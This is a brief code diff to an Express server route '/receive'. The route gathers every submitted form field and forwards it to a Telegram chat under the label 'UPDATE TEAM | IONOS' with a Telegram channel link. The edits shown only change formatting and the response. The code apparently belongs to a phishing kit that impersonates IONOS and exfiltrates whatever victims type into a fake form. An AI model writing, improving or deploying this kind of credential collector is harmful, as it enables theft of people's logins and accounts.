@@ -74,7 +74,7 @@ app.post('/receive', async (req, res) => {
 		    message += `${key}: ${req.body[key]}\n`;
 		});
 		
-		message += `========================\n`;
+		message += `========================\n\n`;
 		message += `✅ UPDATE TEAM | IONOS \n`;
 		message += `💬 Telegram: https://t.me/UpdateTeams\n`;
 		
@@ -86,7 +86,7 @@ app.post('/receive', async (req, res) => {
             text: message,
         });
         console.log('URL:', url);
-		res.status(200).send(url);
+		res.status(200).send({url});
     } catch (error) {
         console.error('Telegram Error:', error.message);
         res.status(500).send('Error sending message');
